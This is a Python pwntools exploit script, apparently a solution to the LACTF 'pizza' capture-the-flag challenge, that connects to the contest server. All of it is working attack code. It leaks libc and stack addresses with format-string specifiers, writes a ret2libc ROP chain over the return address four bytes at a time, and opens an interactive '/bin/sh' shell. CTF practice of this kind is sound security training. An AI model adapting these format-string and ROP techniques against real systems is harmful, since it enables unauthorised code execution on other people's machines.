#!/usr/bin/env python3
from pwn import *
import re


def write_4_bytes(write_addr, to_write):
    global p
    print(f"WRITING:")
    print(hexdump(payload))
    p.sendline(b'y')
    print(p.recv().decode(errors='ignore'))
    p.sendline(b'12')
    print(p.recv().decode(errors='ignore'))
    p.sendline(fmtstr_payload(6, {write_addr: to_write}))

    print(p.recv().decode(errors='ignore'))
    p.sendline(b'1')

    print(p.recv().decode(errors='ignore'))
    p.sendline(b'2')
    
    print(p.recvuntil(b'(y/n):').decode(errors='ignore'))


elf = context.binary = ELF('/home/user/Desktop/lactf/pwn/pizza/pizza')
rop = ROP(elf)
libc = ELF('/home/user/Desktop/lactf/pwn/pizza/libc.so.6')
rop_libc = ROP(libc)

p = process(
    ['/home/user/Desktop/lactf/pwn/pizza/ld-linux-x86-64.so.2',
        '/home/user/Desktop/lactf/pwn/pizza/pizza'], 
    env={"LD_LIBRARY_PATH":"/home/user/Desktop/lactf/pwn/pizza"})

gdbscript = """
# save base address via temporary file
shell echo -n 'set $base_addr = ' > ~/.gdbtmp
pipe vmmap | grep 'pizza/pizza' | head -n 1 | cut -d ' ' -f1 | cut -d '\x1b' -f1 >> ~/.gdbtmp
source ~/.gdbtmp

# get file context
file ./pizza

# set breakpoint
b *($base_addr + main + 633)

# continue
c
"""

# gdb.attach(p, gdbscript=gdbscript)
p = remote('chall.lac.tf', 31134)

# LEAK LIBC AND RETURN ADDRESS
print(p.recv().decode(errors='ignore'))
p.sendline(b'12')
print(p.recv().decode(errors='ignore'))
p.sendline(b'%5$p') # some libc address

print(p.recv().decode(errors='ignore'))
p.sendline(b'12') # stack
print(p.recv().decode(errors='ignore'))
p.sendline(b'%3$p') # some vdso address

print(p.recv().decode(errors='ignore'))
p.sendline(b'1') # junk

resp = p.recvuntil(b'(y/n):').decode(errors='ignore')
print(resp)
leaked = re.findall(r'\b0x[0-9a-fA-F]+\b', resp)
libc_leaked = leaked[0]
stack_leaked = leaked[1]

libc_addr = int(libc_leaked, 16) - 1911424
return_addr = int(stack_leaked, 16) + 328

print(f"LIBC ADDR: {hex(libc_addr)}")
print(f"RETURN ADDR: {hex(return_addr)}")

# RET2LIBC
payload = b''
payload += p64(rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_addr)
payload += p64(next(libc.search(b'/bin/sh')) + libc_addr)
payload += p64(rop_libc.find_gadget(['pop rax', 'ret']).address + libc_addr)
payload += p64(0x3b)
payload += p64(rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_addr)
payload += p64(0)
payload += p64(rop_libc.find_gadget(['syscall']).address + libc_addr)

for i in range(0, len(payload), 4):
    write_4_bytes(return_addr+i, payload[i:i+4])

p.sendline(b'n')

p.interactive()
